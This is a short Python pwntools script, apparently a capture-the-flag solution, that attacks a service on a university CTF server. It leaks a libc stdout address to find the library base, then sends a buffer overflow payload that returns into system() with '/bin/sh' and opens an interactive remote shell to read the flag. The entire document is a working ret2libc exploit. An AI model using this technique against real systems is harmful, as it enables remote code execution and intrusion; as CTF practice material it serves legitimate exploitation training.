#!/usr/bin/env python
from pwn import *

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 10152

context.arch = "i386"
context.os = "linux"

e = ELF("Libc.so")
OUTOFF = e.symbols["stdout"]
SYSOFF = e.symbols["system"]
ARGOFF = next(e.search("/bin/sh"))

s = remote(SERVER, PORT)
s.send('X')

OUT = u32('\xFC' + s.recvline()[-4:-1])
LIBC = OUT - OUTOFF
SYS = p32(LIBC + SYSOFF)
ARG = p32(LIBC + ARGOFF)

PADD = b'X' * 28
EIP = b'X' * 4
s.sendline(PADD + SYS + EIP + ARG)
s.clean()
s.interactive() # cat /home/ctf/flag
s.close()
